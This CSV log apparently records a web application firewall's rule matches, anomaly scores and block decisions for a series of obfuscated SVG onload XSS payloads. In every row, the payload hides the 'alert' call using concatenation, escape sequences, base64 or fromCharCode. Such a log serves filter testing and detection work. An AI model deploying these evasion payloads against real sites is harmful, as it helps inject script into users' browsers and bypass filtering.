2118,"<svg onload=""(function(){var a=parent['\x61le'+'rt'];a(1);})();""></svg>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,11v217,71 || o14,11v217,71t:urlDecodeUni || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603526190.432808
2119,"<svg onload=""(function(){var a=globalThis['\u0061l\u0065rt'];a(1);})();""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760352622.369498
2120,"<svg onload=""(function(){var a=top['a'+'\x6cert'];a(1);})();""></svg>",0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o14,11v217,68 || o14,11v217,68t:urlDecodeUni || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,18v217,68t:urlDecodeUni,t:compressWhitespace || ",30,177603526369.622708
2121,"<svg onload=""(function(){var a=self['aler'+'t'];a(1);})();""></svg>",0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o14,11v217,66 || o14,11v217,66t:urlDecodeUni || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,16v217,66t:urlDecodeUni,t:compressWhitespace || ",30,177603526456.641542
2122,"<svg onload=""(function(){var a=window['a\x6c\x65rt'];a(1);})();""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,71 || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,21v217,71t:urlDecodeUni,t:compressWhitespace || ",25,177603526551.226807
2123,"<svg onload=""(function(){var a=parent['\u0061\u006cert'];a(1);})();""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,75 || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603526774.503429
2124,"<svg onload=""(function(){var a=globalThis[String.fromCharCode(0x61,0x6c,0x65,0x72,0x74)];a(1);})();""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,107 || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760352684.459952
2125,"<svg onload=""(function(){var a=top[atob('YW'+'xlcnQ=')];a(1);})();""></svg>",0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o14,11v217,74 || o14,11v217,74t:urlDecodeUni || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,24v217,74t:urlDecodeUni,t:compressWhitespace || ",30,177603526911.493000
2127,"<svg onload=""(function(){var g=atob('YWxlcnQ');window[g](9);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o53,11v217,66t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,9v217,66t:urlDecodeUni,t:compressWhitespace || ",30,177603527110.192452
2128,"<svg onload=""(function(){var g='al'+'er'+'t';self[g](9);})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o49,11v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,62 || o14,11v217,62t:urlDecodeUni || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,7v217,62t:urlDecodeUni,t:compressWhitespace || ",35,177603527379.571042
2129,"<svg onload=""(function(){var g=String.fromCharCode(97,108,101,114,116);window[g](9);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o77,11v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,90 || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o71,9v217,90t:urlDecodeUni,t:compressWhitespace || ",30,177603527474.731776
2130,"<svg onload=""(function(){var g=['a','l','e','r','t'].join('');window[g](9);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o68,11v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,9v217,81t:urlDecodeUni,t:compressWhitespace || ",30,177603527644.334316
2131,"<svg onload=""(function(){var g='a\x6c\x65rt';window[g](9);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o51,11v217,64t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,9v217,64t:urlDecodeUni,t:compressWhitespace || ",30,177603527741.240570
2132,"<svg onload=""(function(){var g=`a${'l'}ert`;window[g](9);})()"">",0,1,block,8,"932130,933210,934100,941100,941120,941160,941370,949110","o32,23v217,63t:urlDecodeUni,t:cmdLine || o50,11v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o44,9v217,63t:urlDecodeUni,t:compressWhitespace || ",35,177603527871.715931
2133,"<svg onload=""(function(){var g=''.concat('a','l','e','r','t');window[g](9);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o68,11v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,9v217,81t:urlDecodeUni,t:compressWhitespace || ",30,177603527948.172497
2134,"<svg onload=""(function(){var g='\u0061\u006c\u0065\u0072\u0074';window[g](9);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o70,11v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o64,9v217,83t:urlDecodeUni,t:compressWhitespace || ",30,177603528051.493975
2136,"<svg onload=""(function(){var g=top['al'+'ert'];g(9);})()"">",0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o14,11v217,58 || o14,11v217,58t:urlDecodeUni || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,15v217,58t:urlDecodeUni,t:compressWhitespace || ",30,177603528341.225414
2137,"<svg onload=""(function(){var g='al'.concat('ert');globalThis[g](9);})()"">",0,1,block,6,"933210,934100,941100,941120,941160,949110","o60,11v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,73 || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603528439.576686
2139,"<svg onload=""(function(){var g=String['fromCharCode'](97,108,101,114,116);window[g](9);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o37,54v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,93 || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o74,9v217,93t:urlDecodeUni,t:compressWhitespace || ",30,17760352861.204296
2140,"<svg onload=""(function(){var g='ale'+'rt',h=window;h[g](9);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o52,11v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,65 || o14,11v217,65t:urlDecodeUni || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603528844.954618
2141,"<svg onload=""(function(){var g=atob('YWxl'+'cnQ');window[g](9);})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o56,11v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,69 || o14,11v217,69t:urlDecodeUni || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o50,9v217,69t:urlDecodeUni,t:compressWhitespace || ",35,177603528965.542290
2142,"<svg onload=""(function(){var g=unescape('%61%6c%65%72%74');window[g](9);})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o55,11v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,78 || o14,11v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o49,9v217,78t:urlDecodeUni,t:compressWhitespace || ",35,177603529091.734826
2143,"<svg onload=""(function(){var g=Function('return\x20this')();g['al'+'ert'](9);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o61,20v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,83 || o14,11v217,83t:urlDecodeUni || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603529235.256919
2145,"<svg onload=""(function(){var g='a\154\145\162\164';window[g](9);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o57,11v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,70 || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o51,9v217,70t:urlDecodeUni,t:compressWhitespace || ",30,177603529414.088770
2147,"<svg onload=""(function(){var l=String.fromCharCode(97,108,101,114,116);window[l](16);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o77,12v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,91 || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o71,9v217,91t:urlDecodeUni,t:compressWhitespace || ",30,177603529626.885578
2148,"<svg onload=""(function(){var l=atob('YWxlcnQ');window[l](16);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o53,12v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,67 || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,9v217,67t:urlDecodeUni,t:compressWhitespace || ",30,177603529749.203854
2149,"<svg onload=""(function(){var l=['al','ert'].join('');window['a\u006c\u0065rt'](16);})()"">",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o53,25v217,89t:urlDecodeUni,t:compressWhitespace || ",25,177603529858.666115
2151,"<svg onload=""(function(){var l='a'.concat('l','e','r','t');window[l](16);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o65,12v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,79t:urlDecodeUni,t:compressWhitespace || ",30,177603530144.943131
2153,"<svg onload=""(function(){var l='a'+'l'+'e'+'r'+'t';self[l](16);})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o55,12v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,69 || o14,11v217,69t:urlDecodeUni || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o51,7v217,69t:urlDecodeUni,t:compressWhitespace || ",35,17760353036.123346
2154,"<svg onload=""(function(){var l='a'/**/+'l'/**/+'e'/**/+'r'/**/+'t';window[l](16);})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o57,12v217,87t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,87 || o14,11v217,87t:urlDecodeUni || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o67,9v217,87t:urlDecodeUni,t:compressWhitespace || ",35,177603530457.160687
2155,"<svg onload=""(function(){var l=String['fromCharCode'](97,108,101,114,116);window[l](16);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o37,55v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,94 || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o74,9v217,94t:urlDecodeUni,t:compressWhitespace || ",30,177603530559.305709
2157,"<svg onload=""(function(){var l=decodeURI('%61%6C%65%72%74');window[l](16);})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o56,12v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,80 || o14,11v217,80t:urlDecodeUni || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o50,9v217,80t:urlDecodeUni,t:compressWhitespace || ",35,177603530859.995290
2158,"<svg onload=""(function(){var l=''.constructor.fromCharCode(97,108,101,114,116);window[l](16);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o85,12v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,99 || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o79,9v217,99t:urlDecodeUni,t:compressWhitespace || ",30,177603530939.937421
2159,"<svg onload=""(function(){var l=unescape('%61%6c%65%72%74');window[l](16);})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o55,12v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,79 || o14,11v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o49,9v217,79t:urlDecodeUni,t:compressWhitespace || ",35,177603531064.129305
2161,"<svg onload=""(function(){var l=decodeURIComponent('\u0061\u006c\u0065\u0072\u0074');window[l](16);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o90,12v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,104 || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o84,9v217,104t:urlDecodeUni,t:compressWhitespace || ",30,177603531292.956502
2162,"<svg onload=""(function(){var l='al'['\x63oncat']('ert');window[l](16);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o62,12v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,76 || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o56,9v217,76t:urlDecodeUni,t:compressWhitespace || ",30,177603531494.390409
2163,"<svg onload=""(function(){var l='\141\154\145\162\164';window[l](16);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o60,12v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,74 || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o54,9v217,74t:urlDecodeUni,t:compressWhitespace || ",30,177603531587.516478
2164,"<svg onload=""(function(){var l=btoa('YWxlcnQ').split('').reverse().join('');window[atob('YWxlcnQ')](16);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o82,26v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o76,23v217,110t:urlDecodeUni,t:compressWhitespace || ",30,177603531672.841723
2165,"<svg onload=""(function(){var l='a'['concat']('l','e','r','t');top[l](16);})()"">",0,1,block,8,"932105,933210,934100,941100,941120,941160,941370,949110","o61,4v217,79 || o34,43v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,79t:urlDecodeUni,t:compressWhitespace || ",35,177603531782.572622
2166,"<svg onload=""(function(){var l=[]['constructor']['constructor']('return String')()['fromCharCode'](97,108,101,114,116);window[l](16);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o31,106v217,139t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,139 || v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o119,9v217,139t:urlDecodeUni,t:compressWhitespace || ",30,177603531922.474918
2167,"<svg onload=""(function(){var x=String.fromCharCode(97,108,101,114,116);window[x](1);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o77,11v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,90 || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o71,9v217,90t:urlDecodeUni,t:compressWhitespace || ",30,17760353202.536415
2168,"<svg onload=""(function(){var x='a\u006cert';window[x](1);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o50,11v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o44,9v217,63t:urlDecodeUni,t:compressWhitespace || ",30,177603532115.108217
